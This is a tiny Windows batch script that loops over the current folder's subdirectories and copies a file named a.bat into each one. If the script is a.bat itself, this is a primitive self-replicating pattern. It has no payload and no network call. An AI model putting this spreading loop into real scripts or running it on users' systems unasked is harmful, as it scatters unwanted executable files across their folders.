@echo off

for /f %%i in ('dir /ad /b') do copy a.bat %%i

exit